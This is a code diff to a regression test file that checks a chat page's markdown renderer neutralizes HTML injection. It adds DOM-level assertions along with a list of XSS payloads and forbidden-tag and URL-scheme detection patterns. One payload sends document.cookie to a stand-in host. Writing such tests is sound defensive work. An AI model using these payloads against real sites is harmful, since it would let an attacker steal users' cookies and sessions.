@@ -1,6 +1,7 @@
 import { readFileSync } from "node:fs";
 import { fileURLToPath } from "node:url";
-import { describe, expect, it } from "vitest";
+import { Window } from "happy-dom";
+import { beforeAll, describe, expect, it } from "vitest";
 
 // Load the chat renderer straight out of the shipped page so these regression
 // tests always exercise the exact code that runs in production.
@@ -20,14 +21,74 @@ function extract(name: string): string {
   throw new Error(`Could not find end of ${name}()`);
 }
 
-const factory = new Function(
-  `${extract("escapeHtml")}\n${extract("renderMarkdown")}\nreturn { escapeHtml, renderMarkdown };`,
-) as () => {
-  escapeHtml: (s: unknown) => string;
-  renderMarkdown: (s: string) => string;
-};
+const { escapeHtml, renderMarkdown } = (
+  new Function(
+    `${extract("escapeHtml")}\n${extract("renderMarkdown")}\nreturn { escapeHtml, renderMarkdown };`,
+  ) as () => {
+    escapeHtml: (s: unknown) => string;
+    renderMarkdown: (s: string) => string;
+  }
+)();
 
-const { escapeHtml, renderMarkdown } = factory();
+// --- DOM-level assertions: parse the rendered HTML and prove no live
+// script/embed nodes, event handlers, or script-y URLs made it through. ---
+
+let doc: Document;
+
+beforeAll(() => {
+  doc = new Window().document as unknown as Document;
+});
+
+const FORBIDDEN_TAGS = [
+  "script",
+  "iframe",
+  "object",
+  "embed",
+  "style",
+  "link",
+  "meta",
+  "base",
+  "form",
+  "img",
+  "svg",
+  "math",
+  "audio",
+  "video",
+  "a",
+  "input",
+  "textarea",
+];
+
+const TRUSTED_HANDLERS = new Set(["chatSend(this.dataset.q)"]);
+
+function assertSafe(rendered: string) {
+  const host = doc.createElement("div");
+  host.innerHTML = rendered;
+
+  for (const tag of FORBIDDEN_TAGS) {
+    expect(
+      host.querySelectorAll(tag).length,
+      `rendered output created a live <${tag}> element: ${rendered}`,
+    ).toBe(0);
+  }
+
+  for (const el of Array.from(host.querySelectorAll("*"))) {
+    for (const attr of Array.from(el.attributes)) {
+      if (attr.name.startsWith("on")) {
+        // The only inline handler the renderer is allowed to emit is its own
+        // follow-up button handler.
+        expect(
+          TRUSTED_HANDLERS.has(attr.value.trim()),
+          `untrusted inline handler ${attr.name}="${attr.value}" in: ${rendered}`,
+        ).toBe(true);
+      }
+      if (attr.name === "href" || attr.name === "src" || attr.name === "action") {
+        expect(attr.value).not.toMatch(/^\s*(javascript|data|vbscript):/i);
+      }
+    }
+  }
+  return host;
+}
 
 const PAYLOADS = [
   `<script>alert(1)</script>`,
@@ -44,16 +105,18 @@ const PAYLOADS = [
   `<!--<script>alert(1)</script>-->`,
   `<math><mtext><script>alert(1)</script></mtext></math>`,
   `<form><button formaction="javascript:alert(1)">x</button></form>`,
+  `</p><script>alert(1)</script><p>`,
+  `<div onclick="alert(1)">x</div>`,
+  `<input autofocus onfocus=alert(1)>`,
+  `<script>fetch('https://evil.example/'+document.cookie)</script>`,
 ];
-
-const DANGEROUS = /<\s*(script|img|svg|iframe|object|embed|style|form|button|a|body|math|link|meta)\b/i;
 
 describe("escapeHtml", () => {
   it("escapes every HTML metacharacter", () => {
     expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
   });
 
-  it("escapes ampersands before other entities (no double-unescape)", () => {
+  it("escapes ampersands first so entities cannot be smuggled through", () => {
     expect(escapeHtml("&lt;script&gt;")).toBe("&amp;lt;script&amp;gt;");
   });
 
@@ -64,72 +127,78 @@ describe("escapeHtml", () => {
   });
 });
 
-describe("renderMarkdown neutralizes user/model-controlled HTML", () => {
+describe("renderMarkdown neutralizes model/user-controlled HTML", () => {
   for (const payload of PAYLOADS) {
-    it(`neutralizes: ${payload.slice(0, 42)}`, () => {
-      const out = renderMarkdown(payload);
-      expect(out).not.toMatch(DANGEROUS);
-      expect(out).not.toMatch(/\son[a-z]+\s*=/i);
-      expect(out).not.toMatch(/javascript:/i);
-      expect(out).toContain("&lt;");
+    it(`neutralizes: ${payload.slice(0, 44)}`, () => {
+      const host = assertSafe(renderMarkdown(payload));
+      // The payload survives as visible text, not markup.
+      expect(host.textContent).toContain("<");
     });
   }
 
-  it("keeps payloads escaped inside markdown constructs", () => {
+  it("keeps payloads inert inside markdown constructs while markdown still renders", () => {
     const out = renderMarkdown(
-      "## <script>alert(1)</script>\n\n**<img src=x onerror=alert(1)>**\n\n`<svg/onload=alert(1)>`\n\n- <iframe src=javascript:alert(1)>",
+      "## <script>alert(1)</script>\n\n**<img src=x onerror=alert(1)>**\n\n`<svg/onload=alert(1)>`\n\n- <iframe src=javascript:alert(1)>\n\n1. <object data=x>",
     );
-    expect(out).not.toMatch(DANGEROUS);
-    expect(out).not.toMatch(/javascript:(?!\/\/)/i);
-    // Intended markdown structure still renders.
+    assertSafe(out);
     expect(out).toContain("<h4>");
     expect(out).toContain("<strong>");
     expect(out).toContain("<code>");
-    expect(out).toContain("<li>");
+    expect(out).toContain("<li");
   });
 
   it("escapes follow-up buttons in both attribute and text position", () => {
     const out = renderMarkdown(
       `Answer.\n\nFollow-ups:\n- " onclick="alert(1)" x="\n- <script>alert(1)</script>`,
     );
-    expect(out).toContain('class="fq-btn"');
-    expect(out).not.toMatch(DANGEROUS);
-    // The only onclick present is the trusted handler emitted by the renderer.
-    expect(out.match(/onclick=/g)?.length).toBe(2);
-    expect(out).toContain('onclick="chatSend(this.dataset.q)"');
-    expect(out).toContain("&quot;");
+    const host = assertSafe(out);
+    const buttons = host.querySelectorAll("button.fq-btn");
+    expect(buttons.length).toBeGreaterThan(0);
+    for (const btn of Array.from(buttons)) {
+      expect(btn.getAttribute("onclick")).toBe("chatSend(this.dataset.q)");
+    }
   });
 
   it("escapes framework tag content", () => {
-    const out = renderMarkdown("[FRAMEWORK: <img src=x onerror=alert(1)>]");
-    expect(out).toContain('<span class="fw-tag">');
-    expect(out).not.toMatch(DANGEROUS);
+    const host = assertSafe(renderMarkdown("[FRAMEWORK: <img src=x onerror=alert(1)>]"));
+    expect(host.querySelectorAll("span.fw-tag").length).toBe(1);
   });
 
-  it("does not let a payload break out of a paragraph", () => {
-    const out = renderMarkdown(`</p><script>alert(1)</script><p>`);
-    expect(out).not.toMatch(DANGEROUS);
+  it("keeps a long mixed payload inert", () => {
+    const payload = PAYLOADS.join("\n\n");
+    assertSafe(renderMarkdown(payload));
   });
 });
 
 describe("chat rendering call sites", () => {
-  it("only ever assigns innerHTML from renderMarkdown or trusted constants", () => {
+  it("only assigns innerHTML from renderMarkdown or static trusted markup", () => {
     const assignments = [...html.matchAll(/innerHTML\s*=\s*([^;\n]+)/g)].map((m) => m[1].trim());
     expect(assignments.length).toBeGreaterThan(0);
     for (const value of assignments) {
       const trusted =
         value.startsWith("renderMarkdown(") ||
-        value.startsWith("''") ||
-        value.startsWith('""') ||
+        // Static string literal with no interpolation of untrusted data.
+        /^(['"]).*\1$/s.test(value) ||
+        // Trusted module-level icon constants.
         /^[A-Z_]+$/.test(value) ||
-        /^(type === 'ai' \? AI_ICON : USR_ICON|`)/.test(value);
+        value === "type === 'ai' ? AI_ICON : USR_ICON";
       expect(trusted, `untrusted innerHTML source: ${value}`).toBe(true);
     }
   });
 
   it("renders user messages with textContent, never innerHTML", () => {
-    const fn = html.slice(html.indexOf("function addUserMsg("), html.indexOf("function makeAv("));
+    const start = html.indexOf("function addUserMsg(");
+    expect(start).toBeGreaterThan(-1);
+    const fn = html.slice(start, html.indexOf("\nfunction ", start + 10));
     expect(fn).toContain("bubble.textContent = text");
     expect(fn).not.toContain("innerHTML");
+  });
+
+  it("escapes before any markdown substitution runs", () => {
+    const src = extract("renderMarkdown");
+    const escapeAt = src.indexOf("escapeHtml(");
+    const firstReplaceAt = src.indexOf(".replace(");
+    expect(escapeAt).toBeGreaterThan(-1);
+    expect(escapeAt).toBeLessThan(firstReplaceAt);
   });
 });
